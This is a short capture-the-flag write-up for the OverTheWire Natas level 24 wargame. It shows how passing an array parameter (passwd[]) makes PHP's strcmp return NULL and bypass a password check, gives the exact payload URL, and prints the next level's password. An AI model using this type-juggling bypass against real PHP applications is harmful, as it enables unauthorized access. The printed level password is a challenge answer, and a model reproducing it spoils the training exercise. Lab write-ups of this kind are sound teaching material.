# URL: http://natas24.natas.labs.overthewire.org/

# Solution:

Following code is execute to decide if flag can be obtained:
`if(!strcmp($_REQUEST["passwd"],"<censored>")){`

`strcmp` returns 0 (false) when two strings are equal so we need to pass correct string but due to PHP Type System and how `strcmp` works you can pass an empty array and `strcmp` will return 0.
Check `Loose comparision` table here:  
http://php.net/manual/en/types.comparisons.php  
Just use that URL:  
http://natas24.natas.labs.overthewire.org/?passwd[]=%27%27

`Natas 25 password: GHF6X7YwACaYYssHVY05cFq83hRktl4c`
